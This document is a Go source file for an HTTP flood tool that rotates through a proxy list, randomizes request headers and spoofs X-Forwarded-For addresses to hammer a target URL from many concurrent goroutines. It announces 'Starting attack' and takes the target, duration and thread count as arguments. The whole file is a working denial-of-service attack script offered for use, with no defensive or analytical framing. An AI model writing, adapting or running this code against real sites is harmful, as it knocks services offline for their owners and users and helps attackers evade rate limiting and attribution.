package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	proxies []string
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	}
	langHeaders = []string{
		"en-US,en;q=0.9",
		"es-ES,es;q=0.9,gl;q=0.8",
	}
	encodingHeaders = []string{
		"gzip, deflate, br",
		"compress, gzip",
	}
)

func loadProxies(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		return err
	}

	if len(proxies) == 0 {
		return fmt.Errorf("no proxies found in %s", filename)
	}

	return nil
}

func randomString(length int, charset string) string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[r.Intn(len(charset))]
	}
	return string(result)
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func randomHeader(headers []string) string {
	return headers[rand.Intn(len(headers))]
}

func getProxyClient(proxy string) (*http.Client, error) {
	proxyURL, err := url.Parse("http://" + proxy)
	if err != nil {
		return nil, err
	}

	return &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}, nil
}

func flood(target string, duration time.Duration, wg *sync.WaitGroup) {
	defer wg.Done()

	start := time.Now()
	for time.Since(start) < duration {
		proxy := proxies[rand.Intn(len(proxies))]
		client, err := getProxyClient(proxy)
		if err != nil {
			fmt.Println("Failed to use proxy:", proxy, "-", err)
			continue
		}

		req, err := http.NewRequest("GET", target, nil)
		if err != nil {
			fmt.Println("Failed to create request:", err)
			continue
		}

		req.Header.Set("User-Agent", randomString(12, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"))
		req.Header.Set("Accept", randomHeader(acceptHeaders))
		req.Header.Set("Accept-Language", randomHeader(langHeaders))
		req.Header.Set("Accept-Encoding", randomHeader(encodingHeaders))
		req.Header.Set("X-Forwarded-For", randomIP())

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Request error with proxy", proxy, "-", err)
			continue
		}

		_, _ = ioutil.ReadAll(resp.Body)
		resp.Body.Close()
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <target> <time> <threads>")
		return
	}

	target := os.Args[1]
	duration, err := time.ParseDuration(os.Args[2] + "s")
	if err != nil {
		fmt.Println("Invalid duration:", err)
		return
	}
	threads := os.Args[3]

	if err := loadProxies("http.txt"); err != nil {
		fmt.Println("Error loading proxies:", err)
		return
	}

	fmt.Printf("Starting attack on %s for %s with %s threads using proxies\\n", target, duration, threads)

	threadCount := 0
	fmt.Sscanf(threads, "%d", &threadCount)

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go flood(target, duration, &wg)
	}

	wg.Wait()
	fmt.Println("Attack completed.")
}
